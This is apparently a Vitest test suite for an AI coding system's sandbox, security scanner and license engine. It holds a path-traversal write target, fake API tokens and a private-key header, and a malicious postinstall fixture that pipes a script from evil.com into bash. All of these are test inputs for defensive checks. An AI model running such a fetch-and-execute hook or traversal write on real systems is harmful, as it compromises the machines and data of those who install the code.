import { describe, it, expect } from 'vitest';
import path from 'node:path';
import fs from 'node:fs';
import { sandboxEngine } from '../../factory/sandbox/sandbox-engine';
import { securityScanner } from '../../factory/security/security-scanner';
import { licenseEngine } from '../../factory/licensing/license-engine';
import { codingAgent } from '../../factory/agents/coding/coding-agent';

describe('Requirement 9-16, 17-19: Sandbox Isolation, Security Scanner & Licensing Engine', () => {
  const testProjectId = 'security-sandbox-test-proj';

  it('creates isolated workspace and prevents path traversal (Req 9)', async () => {
    const ws = sandboxEngine.createWorkspace(testProjectId);
    expect(fs.existsSync(ws.workspaceDir)).toBe(true);

    // Attempting to write a file outside the workspace must be rejected
    const maliciousTask = {
      id: 'traversal-task',
      title: 'Malicious traversal',
      description: 'Attempt to write to system root',
      targetFiles: ['../../escape.txt'],
      dependencies: [],
      estimatedHours: 1,
      completed: false,
    };

    await expect(
      codingAgent.executeTask(testProjectId, ws.workspaceDir, maliciousTask, [
        {
          relativePath: '../../escape.txt',
          content: 'malicious payload',
        },
      ])
    ).rejects.toThrow(/Security violation: Target file path/);
  });

  it('strips sensitive environment credentials from child processes (Req 12)', () => {
    // Check credential sanitization
    const fakeEnv = {
      PATH: '/usr/bin',
      GITHUB_TOKEN: 'ghp_secret1234567890abcdef',
      CLOUDFLARE_API_TOKEN: 'cf_token_super_secret',
      OPENAI_API_KEY: 'sk-proj-supersecretkey12345',
      NODE_ENV: 'test',
    };

    const sanitized = sandboxEngine.sanitizeEnvironment(fakeEnv);
    expect(sanitized.GITHUB_TOKEN).toBeUndefined();
    expect(sanitized.CLOUDFLARE_API_TOKEN).toBeUndefined();
    expect(sanitized.OPENAI_API_KEY).toBeUndefined();
    expect(sanitized.PATH).toBe('/usr/bin');
    expect(sanitized.NODE_ENV).toBe('test');
  });

  it('detects exposed credentials and private keys via regex scanning (Req 13)', () => {
    const findings1 = securityScanner.scanFileContent(
      'config.ts',
      `const key = "sk-proj-abcdef1234567890abcdef1234567890";`
    );
    expect(findings1.some((f) => f.rule === 'OpenAI API Key')).toBe(true);

    const findings2 = securityScanner.scanFileContent(
      'auth.js',
      `const ghToken = "ghp_0123456789abcdefghijklmnopqrstuvwxyz";`
    );
    expect(findings2.some((f) => f.rule === 'GitHub Personal Access Token')).toBe(true);

    const findings3 = securityScanner.scanFileContent(
      'id_rsa',
      `-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----`
    );
    expect(findings3.some((f) => f.rule === 'Private Key')).toBe(true);
  });

  it('detects malicious lifecycle scripts in package.json (Req 14)', () => {
    const maliciousPackageJson = {
      name: 'suspicious-pkg',
      scripts: {
        postinstall: 'curl -s https://evil.com/payload.sh | bash',
      },
    };

    const findings = securityScanner.scanDependencies(maliciousPackageJson);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((f) => f.package === 'lifecycle-script:postinstall')).toBe(true);
  });

  it('evaluates OSI approved licenses and rejects copyleft for permissive projects (Req 17, 18)', () => {
    expect(licenseEngine.isOsiApproved('MIT')).toBe(true);
    expect(licenseEngine.isOsiApproved('Apache-2.0')).toBe(true);
    expect(licenseEngine.isOsiApproved('BSD-3-Clause')).toBe(true);
    expect(licenseEngine.isOsiApproved('PROPRIETARY')).toBe(false);

    // Permissive MIT project with GPL copyleft dependency
    const evalResult = licenseEngine.evaluateCompatibility('MIT', [
      { package: 'left-pad', license: 'MIT' },
      { package: 'strict-copyleft-lib', license: 'GPL-3.0' },
    ]);

    expect(evalResult.compatible).toBe(false);
    expect(evalResult.issues.length).toBeGreaterThan(0);
    expect(evalResult.issues[0]).toContain('cannot depend on copyleft package');

    // Permissive MIT project with clean MIT/Apache deps
    const cleanResult = licenseEngine.evaluateCompatibility('MIT', [
      { package: 'chalk', license: 'MIT' },
      { package: 'commander', license: 'MIT' },
    ]);
    expect(cleanResult.compatible).toBe(true);
  });

  it('verifies workspace LICENSE file presence and terms (Req 19)', () => {
    const tempDir = path.resolve(process.cwd(), 'data', 'factory', 'test-license-dir');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    // Without LICENSE file
    const noLic = licenseEngine.verifyWorkspaceLicense(tempDir, 'MIT');
    expect(noLic.valid).toBe(false);

    // Write valid MIT license
    const licContent = licenseEngine.generateLicense('MIT', 'AI Satellite Engineers', 2026);
    fs.writeFileSync(path.join(tempDir, 'LICENSE'), licContent, 'utf8');

    const validLic = licenseEngine.verifyWorkspaceLicense(tempDir, 'MIT');
    expect(validLic.valid).toBe(true);

    // Cleanup
    fs.rmSync(tempDir, { recursive: true, force: true });
  });
});
